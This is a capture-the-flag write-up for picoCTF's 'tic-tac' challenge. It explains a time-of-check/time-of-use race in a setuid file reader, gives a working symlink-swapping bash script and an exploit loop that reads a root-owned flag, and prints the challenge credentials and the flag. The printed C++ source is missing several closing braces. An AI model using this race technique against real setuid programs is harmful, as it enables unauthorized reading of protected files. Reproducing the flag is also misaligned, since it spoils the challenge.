# tic-tac : Binary Exploitation

Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. `ssh` to `saturn.picoctf.net:60006`, and run the binary named "txtreader" once connected. Login as `ctf-player` with the password, `d137d16e`

Author : Junias Bonou

# Solution

For now, try connect via SSH.
```
$ ssh -p 60006 ctf-player@saturn.picoctf.net
ctf-player@pico-chall$ ls -al
total 32
drwxr-xr-x 1 ctf-player ctf-player    20 Jun  5 17:04 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
drwx------ 2 ctf-player ctf-player    34 Jun  5 17:04 .cache
-rw-r--r-- 1 root       root          67 Aug  4  2023 .profile
-rw------- 1 root       root          32 Aug  4  2023 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
-rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
```
The program that reads files is src.cpp, and the executable file is txtreader.
The contents of src.cpp are as follows:
```c src.cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>
int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;
  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  return 0;
```
The file owner and the executor must be the same, so I focus on `statbuf.st_uid != getuid()`.  
It clear that stat() is used to verify whether they are the same. Therefore the file can be swapped between the check and the actual read operation — this is a Time-of-Check to Time-of-Use (TOCTOU) vulnerability.  
The file replacement can be achieved through a symlink attack.  
In order to exploit the timing gap between the check and the file read, a symbolic link to `flag.txt` must be created during that window. By continuously alternating between a symlink to a dummy file and one to `flag.txt`, we probabilistically target the correct timing — this is a race condition.  
Below is the symlink swapping script:
```sh replace.sh
#!/bin/bash
while true;
do
    ln -sf src.cpp symlink.txt
    ln -sf flag.txt symlink.txt
done
```
After giving this script execute permission, run it in the background and simultaneously execute `txtreader`.
```
$ chmod +x replace.sh
$ ./replace.sh &
[1] 39
$ while ! ./txtreader symlink.txt | grep pico ; do :; done
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_f482a247}
```

Get the flag!

`picoCTF{ToctoU_!s_3a5y_f482a247}`
